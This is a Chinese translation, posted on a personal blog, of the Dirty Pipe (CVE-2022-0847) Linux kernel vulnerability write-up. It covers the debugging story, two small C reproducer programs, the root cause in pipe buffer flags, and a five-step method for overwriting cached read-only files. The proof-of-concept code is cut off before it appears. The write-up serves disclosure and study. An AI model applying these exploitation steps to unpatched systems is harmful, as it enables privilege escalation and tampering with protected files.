

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/Avatar.jpg">
  <link rel="icon" href="/img/Avatar.jpg">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="看到P牛在知识星球发了这个漏洞，想着跟一下漏洞，由于当时资料较少，于是打算先自行翻译一次，了解一下作者整个发现漏洞流程。">
  <meta name="author" content="corp0ra1">
  <meta name="keywords" content="">
  
  <title>The Dirty Pipe Vulnerability[中文翻译] - corp0ra1&#39;s Blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"corp0ra1.cn","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":80,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"a1a4ccab78dfa522556928ac810fa739","google":"G-4X9XV0H0D5","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="corp0ra1's Blog" type="application/atom+xml">
</head>


<body>
  <header style="height: 60vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
    <div class="container">
        <a class="navbar-brand" href="/">&nbsp;<strong>Corp0ra1's Blog</strong>&nbsp;</a>

        <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

        <!-- Collapsible content -->
        <div class="collapse navbar-collapse" id="navbarSupportedContent">
            <ul class="navbar-nav ml-auto text-center">
                
                    
                        
                            
                                
                                        <li class="nav-item">
                                            <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
                                        </li>
                                        
                                            
                    
                        
                            
                                
                                        <li class="nav-item">
                                            <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
                                        </li>
                                        
                                            
                    
                        
                            
                                
                                        <li class="nav-item">
                                            <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
                                        </li>
                                        
                                            
                    
                        
                            
                                
                                        <li class="nav-item">
                                            <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
                                        </li>
                                        
                                            
                    
                        
                            
                                
                                        <li class="nav-item">
                                            <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
                                        </li>
                                        
                                            
                                                
                                                    <li class="nav-item" id="search-btn">
                                                        <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
                                                    </li>
                                                    
                                                        
                                                            <li class="nav-item" id="color-toggle-btn">
                                                                <a class="nav-link" target="_self">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
                                                            </li>
                                                            
                                                                <li class="nav-item">
                                                                    <a class="nav-link" href="/atom.xml">
                                                                        <i class="iconfont icon-rss"></i>
                                                                    </a>
                                                                </li>
            </ul>
        </div>
    </div>
</nav>
    <div class="banner" id="banner" parallax=true
         style="background: url('/img/tesla.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="The Dirty Pipe Vulnerability[中文翻译]">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2022-03-15 22:56" pubdate>
        2022年3月15日 晚上
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      5.4k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      66
       分钟
    </span>
  

  
  
    
      <!-- 不蒜子统计文章PV -->
      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

    <div class="container-fluid nopadding-x">
        <div class="row nomargin-x">
            <div class="d-none d-lg-block col-lg-2"></div>
            <div class="col-lg-8 nopadding-x-md">
                <div class="container nopadding-x-md" id="board-ctn">
                    <div class="py-5" id="board">
                        <article class="post-content mx-auto">
                            <!-- SEO header -->
                            <h1 style="display: none">
                                The Dirty Pipe Vulnerability[中文翻译]
                            </h1>
                            <div class="markdown-body">
                                <h1 id="The-Dirty-Pipe-Vulnerability"><a href="#The-Dirty-Pipe-Vulnerability" class="headerlink" title="The Dirty Pipe Vulnerability"></a>The Dirty Pipe Vulnerability</h1><p>原文：<a target="_blank" rel="noopener" href="https://dirtypipe.cm4all.com/">The Dirty Pipe Vulnerability</a><br>作者：Max Kellermann <a href="mailto:&#109;&#97;&#x78;&#46;&#x6b;&#101;&#x6c;&#108;&#101;&#114;&#x6d;&#97;&#x6e;&#110;&#64;&#x69;&#111;&#110;&#111;&#x73;&#x2e;&#99;&#111;&#x6d;">&#109;&#97;&#x78;&#46;&#x6b;&#101;&#x6c;&#108;&#101;&#114;&#x6d;&#97;&#x6e;&#110;&#64;&#x69;&#111;&#110;&#111;&#x73;&#x2e;&#99;&#111;&#x6d;</a></p>
<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>这是CVE-2022-0847的故事，自5.8版本以来，Linux内核中存在一个漏洞，允许覆盖任意只读文件中的数据。这会导致权限升级，因为非特权进程可以将代码注入根进程。<br>它类似于CVE-2016-5195“脏牛”，但更容易利用。<br>Linux 5.16.11、5.15.25和5.10.102中修复了该漏洞。</p>
<h1 id="损坏I"><a href="#损坏I" class="headerlink" title="损坏I"></a>损坏I</h1><p>这一切都始于一年前，当时有一张关于文件损坏的工单。一位客户抱怨他们下载的访问日志无法解压缩。事实上，其中一台日志服务器上有一个损坏的日志文件；它可以被解压缩，但gzip报告了一个CRC错误。我无法解释它为什么会损坏，但我认为每晚的split进程发生了crash，造成了文件的损坏。我手动修复了文件的CRC，关闭了工单，很快就忘记了这个问题。<br>几个月后，这种情况一再发生。每次文件的内容看起来都是正确的，只有文件末尾的CRC是错误的。现在有了几个损坏的文件，我能够深入挖掘，发现了一种令人惊讶的损坏问题。一种pattern浮现了出来。</p>
<h1 id="访问日志"><a href="#访问日志" class="headerlink" title="访问日志"></a>访问日志</h1><p>让我简单介绍一下日志服务器的工作原理：在CM4all托管环境中，所有web服务器（运行我们的自定义开源HTTP服务器）都会发送UDP多播数据报，其中包含关于每个HTTP请求的元数据。这些都是运行Pond的日志服务器接收的，Pond是我们定制的开源内存数据库。夜间作业将前一天的所有访问日志拆分(split)为每个托管网站的一个日志，每个日志都用zlib压缩。<br>通过HTTP，一个月的所有访问日志都可以作为一个单独的<code>.gz</code>文件下载。使用一个技巧（涉及到<code>Z_SYNC_FLUSH</code>），我们可以连接所有gzip每日日志文件，而不必解压和重新压缩它们，这意味着这个HTTP请求几乎不消耗CPU。通过使用<code>splice()</code>系统调用将数据直接从硬盘送到HTTP连接中，而不通过内核/用户空间边界（“零拷贝”），进而可以节省内存带宽。<br>Windows用户无法处理<code>.gz</code>文件，但每个人都可以解压缩ZIP文件。一个ZIP文件只是一个<code>.gz</code>文件的容器，因此我们可以使用相同的方法实时生成ZIP文件；我们需要做的就是先发送一个ZIP头，然后和往常一样连接所有<code>.gz</code>文件的内容，后面是中心目录（另一种头）。</p>
<h1 id="损坏II"><a href="#损坏II" class="headerlink" title="损坏II"></a>损坏II</h1><p>以下是一份正式的日常文件的结尾：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">000005f</span>0  <span class="hljs-number">81</span> d6 <span class="hljs-number">94</span> <span class="hljs-number">39</span> <span class="hljs-number">8</span>a <span class="hljs-number">05</span> b0 ed  e9 c0 fd <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> ff ff<br><span class="hljs-number">00000600</span>  <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">9</span>c <span class="hljs-number">12</span> <span class="hljs-number">0b</span> f5 f7 <span class="hljs-number">4</span>a  <span class="hljs-number">00</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
<p><code>00 00 ff ff</code>是允许简单连接的<a target="_blank" rel="noopener" href="https://www.bolet.org/~pornin/deflate-flush-fr.html">sync flush</a>。<code>03 00</code>是一个<a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc1951#page-9">空的“final”块</a>，后面跟一个CRC32（0xf50b129c）和未压缩文件长度（<code>0x00004af7</code>=19191字节）。<br>相同的文件，但已损坏的文件结尾：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">000005f</span>0  <span class="hljs-number">81</span> d6 <span class="hljs-number">94</span> <span class="hljs-number">39</span> <span class="hljs-number">8</span>a <span class="hljs-number">05</span> b0 ed  e9 c0 fd <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> ff ff<br><span class="hljs-number">00000600</span>  <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">50</span> <span class="hljs-number">4b</span> <span class="hljs-number">01</span> <span class="hljs-number">02</span> <span class="hljs-number">1</span>e <span class="hljs-number">03</span>  <span class="hljs-number">14</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
<p>sync flush在，empty final block在，但未压缩的长度现在是<code>0x0014031e</code>=1.3 MB（这是错误的，因为文件是与上面相同的19kB文件）。CRC32为<code>0x02014b50</code>，这与文件内容不匹配。为什么？这是日志客户端中的out-of-bounds write还是heap corruption的BUG？<br>我比较了所有已知的损坏文件，惊讶地发现它们都有相同的CRC32和相同的“文件长度”值。总是相同的CRC——这意味着这不能是CRC计算的结果。对于损坏的数据，我们会看到不同（但错误）的CRC值。我一直盯着代码上的漏洞，盯了几个小时但找不到解释。<br>然后我盯着这8个字节。最终，我意识到<code>50 4b</code>是代表“P”和“K”的ASCII码。“PK”，这就是所有ZIP标题的开头。让我们再看看这8个字节：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-number">50</span> <span class="hljs-number">4b</span> <span class="hljs-number">01</span> <span class="hljs-number">02</span> <span class="hljs-number">1</span>e <span class="hljs-number">03</span> <span class="hljs-number">14</span> <span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
<ul>
<li><code>50 4b</code> is “PK”</li>
<li><code>0x02014b50</code> 是<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/ZIP_(file_format)#Central_directory_file_header">中心目录的特征头</a></li>
<li>“Version made by” = <code>1e 03</code>; <code>0x1e</code> = 30 (3.0); <code>0x03</code> = UNIX</li>
<li>“Version needed to extract” = <code>14 00</code>; <code>0x0014</code> = 20 (2.0)<br>其余的中心目录文件头都不见了；很明显头文件在8字节后被截断。<br>这实际上是ZIP中央目录文件头的开始，这不能是巧合。但编写这些文件的进程中没有生成此类头文件的代码。在绝望中，我查看了zlib源代码和该过程使用的所有其他库，但什么也没找到。这个软件对“PK”头一无所知。<br>不过，有一个进程会生成“PK”头；web服务会实时构造ZIP文件。但这个进程以另一个用户的身份运行，该用户对这些文件没有写权限。不可能是这个进程。<br>所有这些都没有意义，但新的工单不断出现（速度非常慢）。可能存在系统上的问题，但我就是没找到。这让我很沮丧，但我忙于其他任务，我一直把这个文件损坏问题推到任务队列的后面。</li>
</ul>
<h1 id="损坏III"><a href="#损坏III" class="headerlink" title="损坏III"></a>损坏III</h1><p>外部压力使我重新意识到了这个问题。我扫描了整个硬盘，寻找损坏的文件（花了两天时间），希望出现更多的规律。事实上，有一种规律：</p>
<ul>
<li>在过去3个月内，共有37个损坏文件发生在22个独特的日期</li>
<li>其中18天发生1次损坏</li>
<li>1天发生2次损坏（2021-11-21）</li>
<li>1天发生7次损坏（2021-11-30）</li>
<li>1天发生6次损坏（2021-12-31）</li>
<li>1天发生4次损坏（2022-01-31）<br>每个月的最后一天显然是发生文件损坏最多的一天。<br>只有主日志服务器有损坏（提供HTTP连接和构造ZIP文件的服务器）。备用服务器（HTTP非活动，但日志提取过程相同）没有损坏文件。两台服务器上的数据都是相同的，除了那些损坏的文件。<br>这是由脆弱的硬件造成的吗？损坏的RAM？糟糕的存储？宇宙射线？不，这些症状看起来不像是硬件问题。机器里有鬼？我们需要驱魔师吗？</li>
</ul>
<h1 id="盯着代码"><a href="#盯着代码" class="headerlink" title="盯着代码"></a>盯着代码</h1><p>我又开始盯着代码上的漏洞，这次是web服务。<br>请记住，web服务会写入一个ZIP头，然后使用<code>splice()</code>发送所有压缩文件，最后再次使用<code>write()</code>发送“中心目录文件头”，该文件头以<code>50 4b 01 02 1e 03 14 00</code>开头，这正是损坏的位置。通过数据流发送的数据看起来与磁盘上的损坏文件一模一样。但是通过网络发送的进程对这些文件没有写权限（甚至没有尝试这样做），它只读取它们。不管遇到什么困难和不可能的事情，<strong>一定</strong>是这个进程导致了文件损坏，但如何导致文件损坏呢？<br>我的第一个灵感闪现，为什么总是在一个月的最后一天损坏。当网站所有者下载访问日志时，服务器从每月的第一天开始，然后是第二天，依此类推。当然，一个月的最后一天是在月底发送的；一个月的最后一天总是跟在“PK”标题后面。这就是为什么它更有可能在最后一天损坏。（如果请求的月份尚未结束，其他日子也可能会发送文件损坏问题，但这种可能性较小。）<br>所以如何导致文件损坏的？</p>
<h1 id="盯着内核代码"><a href="#盯着内核代码" class="headerlink" title="盯着内核代码"></a>盯着内核代码</h1><p>在这里被困了几个小时之后，且消除了所有绝对不可能的事情之后（在我看来），我得出了一个结论：这一定是一个内核错误。<br>将数据损坏归咎于Linux内核（即其他人的代码）必须是最后的手段。这不太可能。内核是一个极其复杂的项目，由成千上万的人用看似混乱的方法开发；尽管如此，它还是非常稳定和可靠的。但这一次，我确信这一定是一个内核错误。<br>在一个非常清晰的时刻，我破解了两个C程序。<br>一个程序持续将字符串“AAAAA”的奇数块写入文件（模拟日志拆分器）：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<br>  <span class="hljs-keyword">for</span> (;;) <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;AAAAA&quot;</span>, <span class="hljs-number">5</span>);<br>&#125;<br><span class="hljs-comment">// ./writer &gt;foo</span><br></code></pre></td></tr></table></figure>
<p>另一个使用<code>splice()</code>将数据从该文件传输到管道，然后将字符串“BBBBB”写入管道（模拟ZIP生成器）：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span> </span>&#123;<br>  <span class="hljs-keyword">for</span> (;;) &#123;<br>    <span class="hljs-built_in">splice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">write</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;BBBBB&quot;</span>, <span class="hljs-number">5</span>);<br>  &#125;<br>&#125;<br><span class="hljs-comment">// ./splicer &lt;foo |cat &gt;/dev/null</span><br></code></pre></td></tr></table></figure>
<p>我把这两个程序复制到了日志服务器上，然后…<strong>Bingo</strong>！字符串“BBBBB”开始出现在文件中，尽管从未有人将此字符串写入文件（仅通过没有写入权限的进程写入管道）。<br>所以这真的是一个内核错误！<br>一旦BUG被复现，问题就会变得很清晰。通过快速检查，验证了该漏洞影响的是Linux 5.10（Debian Bullseye），而不是Linux 4.19（Debian Buster）。v4.19和v5.10之间有185.011个git commit，但多亏了<code>git bisect</code>，只需17个步骤就可以找到错误的commit 。<br>当<code>bisect</code>到达commit <a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">f6dd975583bd</a>，它为匿名管道缓冲区重构了管道缓冲区代码。它改变了管道““mergeable””检查的方式。</p>
<blockquote>
<p>之前是定义为函数的形式，然后现在定义了一个变量</p>
</blockquote>
<h1 id="管道、缓冲区和页面"><a href="#管道、缓冲区和页面" class="headerlink" title="管道、缓冲区和页面"></a>管道、缓冲区和页面</h1><p>为什么是管道？在我们的设置中，生成ZIP文件的web服务通过管道与web服务器通信；它使用了我们开源的<a target="_blank" rel="noopener" href="https://github.com/CM4all/libwas/">Web应用程序套接字协议</a>，因为我们对CGI、FastCGI和AJP不满意。使用管道而不是通过套接字进行多路复用（如FastCGI和AJP所做的）有一个主要优势：可以在应用程序和web服务器中使用<code>splice()</code>，以获得最大效率。这减少了在进程外的web应用程序的开销（而不是像Apache模块那样在web服务器进程内运行web服务）。这允许在不牺牲（很多）性能的情况下分离权限。<br><a target="_blank" rel="noopener" href="https://www.kernel.org/doc/html/latest/admin-guide/mm/concepts.html">Linux内存管理</a>的简短介绍：CPU管理的最小内存单元是一个<strong>Page</strong>（通常为4KB）。在Linux的内存管理层中，最底层的都是和Page相关。如果应用程序从内核请求内存，它将获得大量（匿名）Pages。所有文件I/O也都与Pages有关：如果从文件中读取数据，内核首先将大量4KB的数据块从硬盘复制到内核内存中，由一个名为<strong>Page cache</strong>(页面缓存)的子系统管理。从那里，数据将被复制到用户空间。Page cache中的副本会保留一段时间，以便再次使用，从而避免不必要的硬盘I/O，直到内核决定更好地使用该内存（回收）。使用<code>mmap()</code>系统调用将Page cache管理的Page直接映射到用户空间，而不需要将文件数据复制到用户空间内存去（以增加页面错误和TLB刷新为代价降低内存带宽的折衷方案）。Linux内核有更多的trick：<code>sendfile()</code>系统调用允许应用程序将文件内容发送到socket，而无需往返到用户空间（这是一种在通过HTTP提供静态文件的web服务器中比较流行的优化措施）。<code>splice()</code>系统调用是<code>sendfile()</code>的一种泛化：它允许进行相同的优化；传输的任一侧是管道，另一侧几乎可以是任何东西（另一个管道、一个文件、一个套接字、一个块设备、一个字符设备）。内核通过传递<strong>Page</strong> 引用(references)来实现这一点，而不是实际复制任何内容（零拷贝）。<br><strong>管道</strong>是单向进程间通信的工具。一端push数据，另一端pull数据。Linux内核通过一个<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/v5.8/include/linux/pipe_fs_i.h#L26-L32">struct pipe_buffer</a>的<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/v5.8/include/linux/pipe_fs_i.h#L76">ring</a>来实现这一点，每个pipe_buffer都指向一个<strong>Page</strong>。对管道的第一次写入会分配一个Page（可容纳4KB数据的空间）。如果最近一次写入没有完全填满页面，则后续写入可能会附加到该现有页面，而不是分配新页面。这就是“匿名”管道缓冲区的工作原理（<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/v5.8/fs/pipe.c#L217-L221">anon_pipe_buf_ops</a>）。<br>但是，如果将<code>splice()</code>数据从文件拼接到管道中，内核将首先将数据加载到<strong>Page cache</strong>中。然后，它将创建一个指向page cache内部的<code>struct pipe_buffer</code> 的指针（零拷贝），但与匿名管道缓冲区不同，写入管道的附加数据不能附加到这样的Page上，因为Page由Page cache而不是管道拥有。<br>检查是否有可以将新数据附加到现有管道缓冲区的代码历史记录：</p>
<ul>
<li>很久之前， <code>struct pipe_buf_operations</code> 有一个flag为<code>can_merge</code>.</li>
<li><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/5274f052e7b3dbd81935772eb551dfd0325dfa9d">Commit 5274f052e7b3 “Introduce sys_splice() system call” (Linux 2.6.16, 2006)</a> 。以<code>splice()系统</code>调用为特色，引入了<code>page_cache_pipe_buf_ops</code>，这是一个<code>struct pipe_buf_operations</code>实现，用于指向page cache的管道缓冲区，第一个是<code>can_merge=0</code>（不可合并）。</li>
<li><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/01e7187b41191376cee8bea8de9f907b001e87b4">https://github.com/torvalds/linux/commit/01e7187b41191376cee8bea8de9f907b001e87b4</a> 将can_merge的flag转换为和 <code>struct pipe_buf_operations</code>指针比较，因为只有一个<code>anon_pipe_buf_ops</code> 可以设置了此标志。</li>
<li><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">Commit f6dd975583bd “pipe: merge anon_pipe_buf*_ops” (Linux 5.8, 2020)</a>  将此指针比较的方式转换为每个缓冲区的flag<code>PIPE_BUF_FLAG_CAN_MERGE</code>.<br>这些年来，这个check被反复重构，哪一个是对的？或者他是什么？</li>
</ul>
<h1 id="未初始化"><a href="#未初始化" class="headerlink" title="未初始化"></a>未初始化</h1><p>在<code>PIPE_BUF_FLAG_CAN_MERGE</code>诞生的几年前，<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b">commit 241699cd72a8 “new iov_iter flavour: pipe-backed” (Linux 4.9, 2016)</a>添加了两个新函数，它们分配了一个新的<code>struct pipe_buffer</code>，但缺少对其flags成员的初始化。现在可以使用任意flags创建Page cache的引用，但这并不重要。从技术上讲，这是一个bug，尽管当时没有任何后果，因为所有现有的flag都无法使用。<br>在Linux5.8中，这个bug突然变得非常严重，因为它使用了<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">commit f6dd975583bd“pipe:merge anon_pipe_buf*_ops”</a>。通过将<code>PIPE_BUF_FLAG_CAN_MERGE</code>注入Page cache引用，使得只需将新数据写入以特殊方式准备的管道，就可以覆盖Page cache中的数据。</p>
<h1 id="损坏IV"><a href="#损坏IV" class="headerlink" title="损坏IV"></a>损坏IV</h1><p>这就解释了文件损坏的原因：首先，一些数据被写入管道，然后大量文件被拼接，并且创建Page cache引用。这些引用随机的，可能有或可能没有设置<code>PIPE_BUF_FLAG_CAN_MERGE</code> 。如果有，那么写入中央目录文件头的<code>write()</code>调用将被写入到最后一个压缩文件的Page cache中。<br>但为什么只有头8个字节？实际上，所有的头都会被复制到页面缓存中，但这个操作不会增加文件大小。原始文件末尾只有8个字节的“未拼接”空间，只有这些字节可以被覆盖。从page cache的角度来看，这一个page的其余部分是未使用的（尽管管道缓冲区代码确实使用它，因为它有自己的页面填充管理）。<br>为什么这种情况不经常发生？因为页面缓存不会写回磁盘，除非它认为页面是“脏”的。意外覆盖页面缓存中的数据不会使页面“脏”。如果没有其他进程“弄脏”文件，则此更改将是短暂的；在下一次重新启动后（或者在内核决定从缓存中删除页面后，比如在内存压力下回收页面），更改将被恢复。这使得有趣的攻击不会在硬盘上留下痕迹。</p>
<h1 id="Exploiting"><a href="#Exploiting" class="headerlink" title="Exploiting"></a>Exploiting</h1><p>在我的第一个EXP中（我用于bisect的“writer”/“splicer”程序），我假设只有在特权进程写入文件时，才能利用这个漏洞，并且它取决于时间。<br>当我意识到真正的问题是什么时，我能够将漏洞扩大很大一部分：即使在没有写入权限的情况下，也有可能覆盖page cache，而不受时间限制，在(几乎)任意位置的任意数据上。这些限制是：</p>
<ul>
<li>攻击者必须具有读取权限（因为它需要将<code>splice()</code> 一个page到一个管道中）。</li>
<li>偏移量不得位于页面边界上（因为该页的至少一个字节必须拼接到管道中）。</li>
<li>写入不能跨越页面边界（因为将为剩余部分创建新的匿名缓冲区）。</li>
<li>无法调整文件大小（因为管道有自己的页面填充管理，并且不会告诉page cache添加了多少数据）<br>要利用此漏洞，您需要：</li>
</ul>
<ol>
<li>创建一个管道。</li>
<li>用任意数据填充管道（在所有环入口中设置<code>PIPE_BUF_FLAG_CAN_MERGEE</code>flag）。</li>
<li>排空管道（在<code>struct pipe_inode_info</code>环上的所有<code>struct pipe_buffer</code>实例中保留设置的flag）。</li>
<li>将目标文件（仅用<code>O_RDONLY</code>打开）中的数据从目标偏移之前拼接到管道中。</li>
<li>将任意数据写入管道；此数据将覆盖缓存的文件页，而不是创建新的匿名<code>struct pipe_buffer</code>，因为设置了<code>PIPE_BUF_FLAG_CAN_MERGE</code> 的flag<br>为了使此漏洞更有趣，它不仅可以在没有写权限的情况下工作，还可以在不可修改文件、只读btrfs快照和只读挂载（包括CD-ROM挂载）上工作。这是因为页面缓存始终是可写的（由内核），而写入管道永远不会检查任何权限。<br>这是我的概念证明：<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span 